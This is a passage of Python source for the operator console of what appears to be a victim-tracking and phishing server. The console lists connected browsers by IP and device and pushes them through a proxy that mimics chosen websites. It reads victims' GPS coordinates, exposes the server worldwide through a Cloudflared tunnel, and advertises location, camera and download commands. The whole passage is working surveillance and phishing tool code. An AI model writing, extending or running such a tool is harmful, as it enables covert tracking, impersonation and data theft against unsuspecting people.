                    for num, site in default_sites.items():
                        print(f"  {CLI_COLORS.BRIGHT_BLUE}{num}.{CLI_COLORS.END} {site}")
                    print(f"  {CLI_COLORS.BRIGHT_BLUE}9.{CLI_COLORS.END} Custom URL")
                    
                    choice = input(f"{CLI_COLORS.BRIGHT_CYAN}> {CLI_COLORS.END}")
                    if choice in default_sites:
                        target_url = default_sites[choice]
                    elif choice == "9":
                        target_url = input(f"{CLI_COLORS.BRIGHT_CYAN}Enter URL to redirect to (include https://): {CLI_COLORS.END}")
                    else:
                        print(f"{CLI_COLORS.RED}Invalid choice.{CLI_COLORS.END}")
                        continue
                    
                    if operation_mode == "global" and cloudflared_url:
                        redirect_url = f"{cloudflared_url}/proxy?url={target_url}"
                    else:
                        redirect_url = f"http://{get_local_ip()}:5000/proxy?url={target_url}"
                    
                    print(f"\n{CLI_COLORS.BRIGHT_GREEN}🔗 Redirecting to:{CLI_COLORS.END} {redirect_url}")
                    socketio.emit('redirect', {'url': redirect_url}, room=sid)
                    
                    client_redirects[sid] = redirect_url
            elif cmd == 'mode':
                new_mode = "global" if operation_mode == "local" else "local"
                confirm = input(f"{CLI_COLORS.BRIGHT_CYAN}Switch to {new_mode} mode? (y/n): {CLI_COLORS.END}").lower()
                
                if confirm == 'y':
                    if new_mode == "global":
                        print(f"{CLI_COLORS.BRIGHT_BLUE}[*] Starting Cloudflared tunnel...{CLI_COLORS.END}")
                        if start_cloudflared():
                            operation_mode = "global"
                            print(f"{CLI_COLORS.GREEN}[✓] Switched to global mode{CLI_COLORS.END}")
                        else:
                            print(f"{CLI_COLORS.RED}[X] Failed to start Cloudflared tunnel{CLI_COLORS.END}")
                    else:
                        stop_cloudflared()
                        operation_mode = "local"
                        print(f"{CLI_COLORS.GREEN}[✓] Switched to local mode{CLI_COLORS.END}")
            elif cmd == 'weather':
                sid = select_client()
                if sid and sid in connected_clients and 'gps' in connected_clients[sid]:
                    gps = connected_clients[sid]['gps']
                    weather = get_weather(gps['lat'], gps['lon'])
                    if weather:
                        print(f"\n{CLI_COLORS.BRIGHT_BLUE}=== Weather Info ==={CLI_COLORS.END}")
                        print(f"  Temperature: {weather['temperature']}°C")
                        print(f"  Windspeed: {weather['windspeed']} km/h")
                        print(f"  Wind Direction: {weather['winddirection']}°")
                        print(f"  Time: {weather['time']}")
                    else:
                        print(f"{CLI_COLORS.RED}Could not retrieve weather data{CLI_COLORS.END}")
                else:
                    print(f"{CLI_COLORS.RED}No GPS data available for this client{CLI_COLORS.END}")
            elif cmd == 'quit':
                print(f"{CLI_COLORS.BRIGHT_BLUE}[x] Shutting down server.{CLI_COLORS.END}")
                stop_cloudflared()
                socketio.stop()
                break
            else:
                print(f"{CLI_COLORS.RED}Unknown command. Try: location | camera | download | message | proxy | info | redirect | mode | weather | quit{CLI_COLORS.END}")
        except KeyboardInterrupt:
            print(f"\n{CLI_COLORS.BRIGHT_BLUE}[x] Keyboard interrupt — shutting down.{CLI_COLORS.END}")
            stop_cloudflared()
            socketio.stop()
            break

def get_current_theme():
    if not active_proxy_url:
        return website_themes['default']
    
    try:
        domain = active_proxy_url.split('url=')[1].split('/')[2].replace('www.', '')
        return website_themes.get(domain, website_themes['default'])
    except:
        return website_themes['default']

def select_client():
    active_clients = [sid for sid, client in connected_clients.items() if client['status'] == 'connected']
    
    if not active_clients:
        print(f"{CLI_COLORS.RED}No active connections.{CLI_COLORS.END}")
        return None
    
    if len(active_clients) == 1:
        return active_clients[0]
    
    print(f"\n{CLI_COLORS.BRIGHT_CYAN}Select a client:{CLI_COLORS.END}")
    for idx, sid in enumerate(active_clients, 1):
        client = connected_clients[sid]
        device_type = client.get('device_info', {}).get('deviceDetails', {}).get('type', 'Unknown')
        browser = client.get('device_info', {}).get('deviceDetails', {}).get('browser', 'Unknown')
        print(f"  {CLI_COLORS.BRIGHT_BLUE}{idx}.{CLI_COLORS.END} {client['ip']} ({device_type}, {browser})")
    
    while True:
        try:
            choice = input(f"{CLI_COLORS.BRIGHT_CYAN}> {CLI_COLORS.END}")
            if not choice:
                return None
            choice = int(choice)
            if 1 <= choice <= len(active_clients):
                return active_clients[choice-1]
            print(f"{CLI_COLORS.RED}Invalid selection.{CLI_COLORS.END}")
        except ValueError:
            print(f"{CLI_COLORS.RED}Please enter a number.{CLI_COLORS.END}")

if __name__ == '__main__':
    cli_thread = threading.Thread(target=cli_loop, daemon=True)
    cli_thread.start()
    
    print(f"{CLI_COLORS.BRIGHT_BLUE}[*] Starting server on port 5000...{CLI_COLORS.END}")
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)